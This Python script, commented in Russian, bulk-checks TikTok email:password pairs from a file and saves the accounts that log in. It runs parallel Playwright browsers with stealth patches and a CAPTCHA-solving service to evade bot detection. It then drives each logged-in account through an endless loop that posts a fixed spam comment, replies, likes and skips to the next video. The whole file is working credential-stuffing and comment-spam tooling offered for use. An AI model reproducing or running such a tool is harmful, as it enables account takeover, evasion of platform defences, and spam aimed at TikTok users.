import asyncio
import os
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Any
from loguru import logger
from playwright.async_api import async_playwright, Page
from playwright_stealth import stealth_async, StealthConfig
from tiktok_captcha_solver import AsyncPlaywrightSolver


@dataclass
class Config:
    """Класс для управления настройками скрипта"""
    sadcaptcha_api_key: str = "SADCAPCHA_API_KEY"

    # Пути к файлам
    accounts_filename: str = "acc.txt"
    output_dir: str = "accounts"
    log_filename: str = "tiktok_checker.log"

    # Параметры браузера
    max_browsers: int = 10
    browser_headless: bool = False
    max_check_attempts: int = 1

    # Таймауты (в секундах)
    page_timeout: int = 3
    action_delay: float = 0.5
    comment_delay: float = 1.0

    # Включение/отключение действий
    enable_commenting: bool = True
    enable_reply_commenting: bool = True
    enable_liking: bool = True
    enable_next_video: bool = True

    # Настройки спама комментариями
    enable_comment_loop: bool = True  # Включить циклическое комментирование
    comment_loop_count: int = 0  # 0 = бесконечный цикл, >0 = определенное количество циклов
    comment_loop_delay: int = 1  # Задержка между циклами комментирования (секунды)

    # Содержание комментариев
    comment_text: str = "Мальчики, оцените историю😅🍑"
    comment_texts: List[str] = field(default_factory=list)

    # Режим "висения" после успешного входа
    enable_hanging: bool = True
    hang_check_interval: int = 60  # секунды между проверками в режиме висения

    # Аргументы для запуска браузера
    browser_args: List[str] = field(default_factory=lambda: [
        '--no-sandbox',
        '--disable-gpu',
        '--disable-dev-shm-usage',
        '--disable-extensions',
        '--disable-setuid-sandbox',
        '--disable-infobars',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-site-isolation-trials',
        '--ignore-certificate-errors',
        '--disable-accelerated-2d-canvas',
        '--disable-browser-side-navigation',
        '--disable-default-apps',
        '--no-first-run'
    ])

    # Настройки контекста браузера
    browser_context_options: Dict[str, Any] = field(default_factory=lambda: {
        'viewport': {'width': 1260, 'height': 700},
        'user_agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        'ignore_https_errors': True,
        'java_script_enabled': True,
    })

    # Настройки для stealth-режима
    stealth_config: Dict[str, bool] = field(default_factory=lambda: {
        'navigator_languages': False,
        'navigator_vendor': False,
        'navigator_user_agent': False
    })


class Stats:
    """Класс для отслеживания статистики по действиям"""

    def __init__(self):
        self.counters = {
            'total_accounts': 0,
            'processed': 0,
            'successful': 0,
            'failed': 0,
            'errors': 0,
            'comments': 0,
            'replies': 0,
            'likes': 0,
            'next_videos': 0,
            'comment_loops': 0,  # Количество выполненных циклов комментирования
            'comments_per_video': {},  # Статистика по комментариям на каждое видео
        }
        self.start_time = datetime.now()
        self.lock = asyncio.Lock()

    async def increment(self, key: str, value: int = 1):
        """Безопасно увеличивает счетчик"""
        async with self.lock:
            self.counters[key] = self.counters.get(key, 0) + value

    async def get_report(self) -> str:
        """Генерирует строку с текущей статистикой"""
        async with self.lock:
            runtime = datetime.now() - self.start_time
            report = f"Статистика:\n"
            report += f"Время работы: {runtime}\n"
            report += f"Обработано: {self.counters['processed']}/{self.counters['total_accounts']} | "
            report += f"Успешно: {self.counters['successful']} | "
            report += f"Неуспешно: {self.counters['failed']} | "
            report += f"Ошибки: {self.counters['errors']}\n"

            if any(self.counters.get(k, 0) > 0 for k in ['comments', 'replies', 'likes', 'next_videos']):
                report += f"Действия: "
                report += f"Комментарии: {self.counters.get('comments', 0)} | "
                report += f"Ответы: {self.counters.get('replies', 0)} | "
                report += f"Лайки: {self.counters.get('likes', 0)} | "
                report += f"Переходы: {self.counters.get('next_videos', 0)}"

            if self.counters.get('comment_loops', 0) > 0:
                report += f"\nЦиклы комментирования: {self.counters.get('comment_loops', 0)}"

            # Статистика по видео
            if self.counters.get('comments_per_video', {}):
                report += "\nСтатистика по видео:"
                for video_id, count in self.counters.get('comments_per_video', {}).items():
                    report += f"\n - {video_id}: {count} комментариев"

            return report


class FileHandler:
    """Класс для работы с файлами учетных записей"""

    def __init__(self, config: Config):
        self.config = config
        os.makedirs(config.output_dir, exist_ok=True)

    def save_account(self, email: str, password: str, cookies: List[Dict]) -> bool:
        """Сохраняет информацию об успешном входе в аккаунт"""
        safe_filename = f"{self.config.output_dir}/{email.replace(':', '_')}.txt"

        try:
            with open(safe_filename, 'w', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
                f.write("Успешный вход - скрипт находится в режиме ожидания")

            logger.info(f"Аккаунт {email} - ВАЛИДНЫЙ ✓ | Сохранен в {safe_filename}")
            return True
        except Exception as e:
            logger.error(f"Ошибка сохранения аккаунта {email}: {type(e).__name__}: {str(e)}")
            return False

    def read_accounts(self) -> List[Dict]:
        """Читает учетные данные из файла"""
        accounts = []
        try:
            with open(self.config.accounts_filename, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        email, password = line.split(':', 1)
                        accounts.append({'email': email, 'password': password})
            logger.info(f"Загружено {len(accounts)} аккаунтов из {self.config.accounts_filename}")
        except Exception as e:
            logger.error(f"Ошибка чтения аккаунтов из {self.config.accounts_filename}: {type(e).__name__}: {str(e)}")
        return accounts


class TikTokActions:
    """Класс для выполнения действий на TikTok"""

    def __init__(self, page: Page, config: Config, stats: Stats):
        self.page = page
        self.config = config
        self.stats = stats
        self.current_video_id = "unknown"  # Идентификатор текущего видео для отслеживания
        import random
        self.random = random

    def get_comment_text(self) -> str:
        """Возвращает текст комментария, случайно выбирая из списка, если он есть"""
        if self.config.comment_texts:
            return self.random.choice(self.config.comment_texts)
        return self.config.comment_text

    async def update_video_id(self):
        """Обновляет идентификатор текущего видео, используя URL или другие данные"""
        try:
            # Попытка получить ID видео из URL или других элементов страницы
            current_url = self.page.url
            if "video/" in current_url:
                # Извлекаем ID видео из URL
                self.current_video_id = current_url.split("video/")[1].split("?")[0]
            else:
                # Используем временную метку, если не можем получить реальный ID
                self.current_video_id = f"video_{datetime.now().strftime('%H%M%S')}"

            # Инициализируем счетчик комментариев для этого видео, если его еще нет
            if self.current_video_id not in self.stats.counters['comments_per_video']:
                self.stats.counters['comments_per_video'][self.current_video_id] = 0

        except Exception as e:
            logger.warning(f"Не удалось определить ID видео: {e}")
            self.current_video_id = f"unknown_{datetime.now().strftime('%H%M%S')}"

    async def post_comment(self, email: str) -> bool:
        """Оставляет комментарий под текущим видео"""
        if not self.config.enable_commenting:
            return False

        try:
            await self.update_video_id()

            # Используем ПЕРВОЕ поле ввода для основного комментария
            comment_input = self.page.locator('div[data-e2e="comment-input"]').first
            await comment_input.click()
            await asyncio.sleep(self.config.action_delay)

            comment_text = self.get_comment_text()
            await self.page.keyboard.type(comment_text)
            await asyncio.sleep(self.config.action_delay)
            await self.page.keyboard.press('Enter')
            await asyncio.sleep(self.config.comment_delay)

            # Обновляем статистику
            await self.stats.increment('comments')
            self.stats.counters['comments_per_video'][self.current_video_id] = self.stats.counters[
                                                                                   'comments_per_video'].get(
                self.current_video_id, 0) + 1

            logger.success(
                f"Успешно оставлен комментарий для {email} (Видео: {self.current_video_id}, #{self.stats.counters['comments_per_video'][self.current_video_id]})")
            return True
        except Exception as e:
            logger.error(f"Ошибка при оставлении комментария: {type(e).__name__}: {str(e)}")
            return False

    async def reply_to_comment(self, email: str) -> bool:
        """Отвечает на существующий комментарий"""
        if not self.config.enable_reply_commenting:
            return False

        try:
            # Находим кнопку ответа на первый комментарий
            reply_button = self.page.locator('span[data-e2e="comment-reply-1"]').first
            await reply_button.click()
            await asyncio.sleep(self.config.comment_delay)

            # После нажатия кнопки "Ответить" используем ПОСЛЕДНЕЕ поле ввода (которое появилось для ответа)
            reply_input = self.page.locator('div[data-e2e="comment-input"]').last
            await reply_input.click()
            await asyncio.sleep(self.config.action_delay)

            comment_text = self.get_comment_text()
            await self.page.keyboard.type(comment_text)
            await asyncio.sleep(self.config.action_delay)

            await self.page.keyboard.press('Enter')
            await asyncio.sleep(self.config.comment_delay)

            logger.success(f"Успешно оставлен ответ на комментарий для {email}")
            await self.stats.increment('replies')
            return True
        except Exception as e:
            logger.warning(f"Не удалось ответить на комментарий: {type(e).__name__}: {str(e)}")
            return False

    async def post_comment(self, email: str) -> bool:
        """Оставляет комментарий под текущим видео"""
        if not self.config.enable_commenting:
            return False

        try:
            await self.update_video_id()

            # Используем ПЕРВОЕ поле ввода для основного комментария
            comment_input = self.page.locator('div[data-e2e="comment-input"]').first
            await comment_input.click()
            await asyncio.sleep(self.config.action_delay)

            comment_text = self.get_comment_text()
            await self.page.keyboard.type(comment_text)
            await asyncio.sleep(self.config.action_delay)
            await self.page.keyboard.press('Enter')
            await asyncio.sleep(self.config.comment_delay)

            # Обновляем статистику
            await self.stats.increment('comments')
            self.stats.counters['comments_per_video'][self.current_video_id] = self.stats.counters[
                                                                                   'comments_per_video'].get(
                self.current_video_id, 0) + 1

            logger.success(
                f"Успешно оставлен комментарий для {email} (Видео: {self.current_video_id}, #{self.stats.counters['comments_per_video'][self.current_video_id]})")
            return True
        except Exception as e:
            logger.error(f"Ошибка при оставлении комментария: {type(e).__name__}: {str(e)}")
            return False

    async def like_video(self, email: str) -> bool:
        """Ставит лайк текущему видео"""
        if not self.config.enable_liking:
            return False

        try:
            like_button_browse = self.page.locator('strong[data-e2e="browse-like-count"]').first
            like_button_standard = self.page.locator('strong[data-e2e="like-count"]').first

            if await like_button_browse.count() > 0:
                logger.info("Найдена кнопка browse-like-count")
                await like_button_browse.click()
                await asyncio.sleep(self.config.action_delay)
                logger.success(f"Успешно поставлен лайк (browse-like-count) для {email}")
                await self.stats.increment('likes')
                return True
            elif await like_button_standard.count() > 0:
                logger.info("Найдена кнопка like-count")
                await like_button_standard.click()
                await asyncio.sleep(self.config.action_delay)
                logger.success(f"Успешно поставлен лайк (like-count) для {email}")
                await self.stats.increment('likes')
                return True
            else:
                logger.warning("Не найдена кнопка лайка")
                return False

        except Exception as e:
            logger.error(f"Ошибка при постановке лайка: {type(e).__name__}: {str(e)}")
            return False

    async def next_video(self, email: str, captcha_solver) -> bool:
        """Переходит к следующему видео"""
        if not self.config.enable_next_video:
            return False

        try:
            logger.info(f"Пытаемся найти и нажать на кнопку Следующее видео для {email}")

            # Пробуем найти кнопку по data-e2e="arrow-right"
            next_video_button = self.page.locator('button[data-e2e="arrow-right"]')

            # Проверяем, найдена ли кнопка
            if await next_video_button.count() > 0:
                await next_video_button.click()
                await asyncio.sleep(self.config.action_delay)
                logger.success(f"Успешно нажали на кнопку Следующее видео для {email}")
                await self.stats.increment('next_videos')
                await captcha_solver.solve_captcha_if_present()
                await self.update_video_id()  # Обновляем ID видео после перехода
                return True
            else:
                # Альтернативный поиск по CSS классу, если первый способ не сработал
                next_video_button_alt = self.page.locator('.css-1s9jpf8-ButtonBasicButtonContainer-StyledVideoSwitch')
                if await next_video_button_alt.count() > 0:
                    await next_video_button_alt.click()
                    await asyncio.sleep(self.config.action_delay)
                    logger.success(f"Успешно нажали на кнопку Следующее видео (по CSS классу) для {email}")
                    await self.stats.increment('next_videos')
                    await self.update_video_id()  # Обновляем ID видео после перехода
                    await captcha_solver.solve_captcha_if_present()

                    return True
                else:
                    logger.warning(f"Не удалось найти кнопку Следующее видео")
                    return False

        except Exception as e:
            logger.error(f"Ошибка при нажатии на кнопку Следующее видео: {type(e).__name__}: {str(e)}")
            return False

    async def run_comment_loop(self, email: str, captcha_solver):
        """Выполняет циклическое комментирование"""
        if not self.config.enable_comment_loop:
            return

        loop_count = 0
        max_loops = self.config.comment_loop_count
        comments_opened = False

        try:
            # Находим и открываем комментарии только в самом начале
            try:
                comments_section = self.page.locator('div[data-e2e="comment-input"]')
                if await comments_section.count() == 0:
                    comments_button = self.page.locator('span[data-e2e="comment-icon"]').first
                    await comments_button.click()
                    await captcha_solver.solve_captcha_if_present()
                    await asyncio.sleep(self.config.comment_delay)
                    comments_opened = True
                    logger.info(f"Комментарии успешно открыты для {email}")
                else:
                    comments_opened = True
                    logger.info(f"Комментарии уже открыты для {email}")
            except Exception as e:
                logger.warning(f"Не удалось открыть секцию комментариев: {e}")
                return

            # Основной цикл комментирования
            while max_loops == 0 or loop_count < max_loops:
                # СНАЧАЛА пытаемся ответить на существующий комментарий, если это разрешено
                if self.config.enable_reply_commenting:
                    try:
                        reply_success = await self.reply_to_comment(email)
                        if reply_success:
                            logger.success(f"Успешно ответили на комментарий в цикле {loop_count + 1}")
                    except Exception as e:
                        logger.warning(f"Ошибка при ответе на комментарий: {type(e).__name__}: {str(e)}")

                # ЗАТЕМ оставляем свой комментарий
                comment_success = await self.post_comment(email)

                if comment_success:
                    loop_count += 1
                    await self.stats.increment('comment_loops')
                    logger.info(
                        f"Цикл комментирования {loop_count}{' из ' + str(max_loops) if max_loops > 0 else ''} завершен")

                    # Ставим лайк, если это разрешено
                    if self.config.enable_liking:
                        await self.like_video(email)

                    # Переходим к следующему видео после цикла, если это разрешено
                    if self.config.enable_next_video:
                        next_success = await self.next_video(email, captcha_solver)
                        if not next_success:
                            logger.warning("Не удалось перейти к следующему видео, продолжаем с текущим")

                    # Задержка между циклами
                    if max_loops == 0 or loop_count < max_loops:
                        logger.info(f"Ожидание {self.config.comment_loop_delay} секунд перед следующим циклом")
                        await asyncio.sleep(self.config.comment_loop_delay)
                else:
                    logger.warning(f"Не удалось оставить комментарий в цикле {loop_count + 1}")
                    # Пробуем переключиться на следующее видео
                    if await self.next_video(email, captcha_solver):
                        logger.info("Перешли к следующему видео после неудачной попытки комментирования")
                    else:
                        logger.error("Не удалось найти новое видео для комментирования")
                        break

        except Exception as e:
            logger.error(f"Ошибка в цикле комментирования: {type(e).__name__}: {str(e)}")

        logger.info(f"Цикл комментирования завершен. Всего комментариев: {self.stats.counters['comments']}")

class TikTokChecker:
    """Основной класс для проверки аккаунтов TikTok"""

    def __init__(self, config: Config, stats: Stats):
        self.config = config
        self.stats = stats
        self.file_handler = FileHandler(config)
        self.successful_logins = []  # Отслеживание успешных входов в браузер

    async def check_account(self, account: Dict) -> bool:
        """Проверяет один аккаунт TikTok"""
        email = account['email']
        password = account['password']

        for attempt in range(1, self.config.max_check_attempts + 1):
            if attempt > 1:
                logger.info(f"Повторная попытка {attempt}/{self.config.max_check_attempts} для {email}")

            browser = None
            context = None

            try:
                async with async_playwright() as p:
                    browser = await p.chromium.launch(
                        headless=self.config.browser_headless,
                        args=self.config.browser_args
                    )

                    context = await browser.new_context(**self.config.browser_context_options)
                    context.set_default_timeout(self.config.page_timeout * 1000)

                    page = await context.new_page()

                    # Настройка stealth
                    config = StealthConfig(**self.config.stealth_config)
                    await stealth_async(page, config)

                    # Инициализация решателя капчи
                    captcha_solver = AsyncPlaywrightSolver(
                        page=page,
                        sadcaptcha_api_key=self.config.sadcaptcha_api_key,
                        mouse_step_size=2,
                        mouse_step_delay_ms=5
                    )

                    # Загрузка страницы логина
                    await page.goto('https://www.tiktok.com/login/phone-or-email/email')
                    await asyncio.sleep(self.config.action_delay)

                    # Локаторы элементов формы
                    email_input = page.locator('input[type="text"]')
                    password_input = page.locator('input[type="password"]')
                    login_button = page.locator('button[data-e2e="login-button"], button[type="submit"]')

                    # Проверка существования элементов формы
                    if await email_input.count() == 0 or await password_input.count() == 0 or await login_button.count() == 0:
                        logger.warning(f"Не удалось загрузить форму входа для {email}")
                        continue

                    # Заполнение формы входа
                    await email_input.fill(email)
                    await asyncio.sleep(self.config.action_delay)
                    await password_input.fill(password)
                    await asyncio.sleep(self.config.action_delay)

                    # Нажатие кнопки входа
                    await login_button.click()
                    await asyncio.sleep(self.config.action_delay)

                    # Попытка решить капчу
                    try:
                        await captcha_solver.solve_captcha_if_present()
                    except Exception as e:
                        logger.warning(f"Ошибка решения капчи: {type(e).__name__}: {str(e)}")
                        pass

                    # Ожидание завершения входа
                    await asyncio.sleep(8)

                    # Проверка на код верификации
                    try:
                        verification_code = page.locator('.verification-code-input, input[name="verifyCode"]')
                        if await verification_code.count() > 0:
                            logger.warning(f"Аккаунт {email} требует код верификации")
                            await self.stats.increment('failed')
                            return False
                    except Exception:
                        pass

                    current_url = page.url
                    if "login" in current_url:
                        logger.warning(f"Аккаунт {email} - НЕВАЛИДНЫЙ ✗")
                        await self.stats.increment('failed')
                        return False

                    # Сохранение информации об аккаунте
                    success = self.file_handler.save_account(email, password, [])

                    if success:
                        logger.success(f"Успешный вход в аккаунт {email}")
                        await self.stats.increment('successful')

                        # Выполнение действий в TikTok
                        actions = TikTokActions(page, self.config, self.stats)

                        try:
                            # Для начала можем поставить лайк
                            if self.config.enable_liking:
                                await actions.like_video(email)

                            # Запускаем основной цикл комментирования, если он включен
                            if self.config.enable_comment_loop:
                                logger.info(f"Запуск цикла комментирования для {email}")
                                await actions.run_comment_loop(email, captcha_solver)
                            else:
                                # Традиционный подход без циклов
                                comments_button = page.locator('span[data-e2e="comment-icon"]').first
                                await comments_button.click()
                                await captcha_solver.solve_captcha_if_present()
                                await asyncio.sleep(self.config.comment_delay)

                                # Попытка ответить на существующий комментарий
                                await actions.reply_to_comment(email)

                                # Оставить новый комментарий
                                await actions.post_comment(email)

                                # Перейти к следующему видео
                                await actions.next_video(email, captcha_solver)

                        except Exception as e:
                            logger.error(f"Ошибка при выполнении действий для {email}: {type(e).__name__}: {str(e)}")

                        # Формируем отчет о действиях
                        try:
                            report = await self.stats.get_report()
                            logger.info(f"Текущая статистика действий:\n{report}")
                        except Exception as e:
                            logger.error(f"Ошибка при формировании отчета: {e}")

                        # Сохраняем браузер для "висения"
                        if self.config.enable_hanging:
                            self.successful_logins.append((browser, context))
                            return True
                        else:
                            await context.close()
                            await browser.close()
                            return True

            except Exception as e:
                logger.error(f"Ошибка проверки {email}: {type(e).__name__}: {str(e)}")

                if browser and not context:
                    try:
                        await browser.close()
                    except:
                        pass

                if attempt == self.config.max_check_attempts:
                    logger.warning(f"Аккаунт {email} - ОШИБКА ✗")
                    await self.stats.increment('errors')
                    return False

                await asyncio.sleep(1)

        return False


class AccountProcessor:
    """Класс для обработки группы аккаунтов"""

    def __init__(self, accounts: List[Dict], config: Config):
        self.accounts = accounts
        self.config = config
        self.stats = Stats()
        self.checker = TikTokChecker(config, self.stats)
        self.next_index = 0
        self.lock = asyncio.Lock()

    async def worker(self, worker_id: int, semaphore: asyncio.Semaphore):
        """Обработчик для одного параллельного потока проверки"""
        while True:
            async with self.lock:
                if self.next_index >= len(self.accounts):
                    break

                account_index = self.next_index
                self.next_index += 1
                current_account = self.accounts[account_index]
                current_account['index'] = account_index + 1

            async with semaphore:
                email = current_account['email']
                logger.info(f"[{account_index + 1}/{len(self.accounts)}] Проверка {email}")

                try:
                    await self.checker.check_account(current_account)

                    async with self.lock:
                        await self.stats.increment('processed')

                        if self.stats.counters['processed'] % 5 == 0 or self.stats.counters['processed'] == len(
                                self.accounts):
                            report = await self.stats.get_report()
                            logger.info(report)

                except Exception as e:
                    logger.error(f"Критическая ошибка проверки {email}: {type(e).__name__}: {str(e)}")
                    async with self.lock:
                        await self.stats.increment('processed')
                        await self.stats.increment('errors')

    async def process_all(self):
        """Обрабатывает все аккаунты с параллельным выполнением"""
        if not self.accounts:
            logger.warning("Нет аккаунтов для проверки")
            return

        # Обновляем статистику
        await self.stats.increment('total_accounts', len(self.accounts))

        logger.info(f"Начинаем проверку {len(self.accounts)} аккаунтов")

        # Создаем семафор для ограничения параллельных браузеров
        semaphore = asyncio.Semaphore(self.config.max_browsers)

        # Создаем и запускаем задачи работников
        tasks = []
        for worker_id in range(min(self.config.max_browsers, len(self.accounts))):
            task = asyncio.create_task(self.worker(worker_id + 1, semaphore))
            tasks.append(task)

        # Ожидаем завершения всех задач
        await asyncio.gather(*tasks)

        report = await self.stats.get_report()
        logger.success("Проверка аккаунтов завершена!")
        logger.success(report)

        # Поддерживаем "висящие" сессии, если они есть
        if self.checker.successful_logins and self.config.enable_hanging:
            logger.info(
                f"Успешный вход в {len(self.checker.successful_logins)} аккаунтов. Скрипт находится в режиме ожидания...")
            try:
                while True:
                    logger.info("Скрипт продолжает работу... Сессии браузера активны.")
                    await asyncio.sleep(self.config.hang_check_interval)
            except KeyboardInterrupt:
                logger.info("Получен сигнал остановки. Закрываем браузеры...")
                for browser, context in self.checker.successful_logins:
                    try:
                        await context.close()
                        await browser.close()
                    except:
                        pass


async def main():
    """Основная функция скрипта"""
    logger.remove()
    logger.add("tiktok_checker.log", rotation="10 MB", level="INFO")
    logger.add(
        lambda msg: print(msg, end=""),
        colorize=True,
        level="INFO",
        format="{time:HH:mm:ss} | <level>{message}</level>"
    )

    logger.info("=" * 60)
    logger.info("Th - проверка аккаунтов")
    logger.info("=" * 60)

    # Инициализация конфигурации
    config = Config()

    # Загрузка аккаунтов
    file_handler = FileHandler(config)
    accounts = file_handler.read_accounts()

    # Обработка аккаунтов
    processor = AccountProcessor(accounts, config)
    await processor.process_all()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Скрипт остановлен пользователем")